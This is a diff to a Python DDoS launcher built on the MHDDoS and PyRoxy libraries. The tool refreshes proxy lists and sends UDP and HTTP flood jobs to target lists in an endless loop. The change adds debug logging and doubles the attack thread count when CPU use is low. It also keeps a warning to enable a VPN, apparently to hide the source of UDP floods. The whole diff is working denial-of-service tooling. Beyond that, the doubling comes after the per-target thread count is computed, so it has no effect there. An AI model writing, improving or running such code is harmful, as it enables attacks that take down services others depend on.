@@ -3,6 +3,7 @@ import json
 import multiprocessing
 import os
 import random
+import logging
 import subprocess
 import sys
 import time
@@ -11,7 +12,13 @@ from concurrent.futures import ThreadPoolExecutor, as_completed
 from .MHDDoS.start import ProxyManager
 from PyRoxy import ProxyChecker
 from PyRoxy import ProxyType
+from psutil import cpu_percent  # Add import for CPU monitoring
 
+logging.basicConfig(level=logging.DEBUG)  # Set logging level to DEBUG
+
+
+def get_cpu_usage():
+    return cpu_percent(interval=1)  # Check CPU usage over the last second
 
 def update_proxies(period, proxy_timeout, threads, targets):
     #  Avoid parsing proxies too often when restart happens
@@ -64,12 +71,19 @@ def update_proxies(period, proxy_timeout, threads, targets):
 
 
 def run_ddos(targets, total_threads, period, rpc, udp_threads, http_methods, debug):
+    current_cpu_usage = get_cpu_usage()
     threads_per_target = total_threads // len(targets)
+
+    # Adjust threads dynamically based on CPU usage
+    if current_cpu_usage < 50:  # If CPU usage is below 50%
+        total_threads *= 2  # Double the total threads
+        logging.debug(f'Doubling total threads to {total_threads} due to low CPU usage ({current_cpu_usage}%)')
+
     params_list = []
     for target in targets:
         # UDP
         if target.lower().startswith('udp://'):
-            print(f'Make sure VPN is enabled - proxies are not supported for UDP targets: {target}')
+            logging.warning(f'Make sure VPN is enabled - proxies are not supported for UDP targets: {target}')
             params_list.append([
                 'UDP', target[6:], str(udp_threads), str(period)
             ])
@@ -109,6 +123,8 @@ def start(total_threads, period, targets, rpc, udp_threads, http_methods, proxy_
     while True:
         if not no_proxies:
             update_proxies(period, proxy_timeout, total_threads, targets)
+            logging.debug('Proxy update completed')
+
         run_ddos(targets, total_threads, period, rpc, udp_threads, http_methods, debug)
 
 
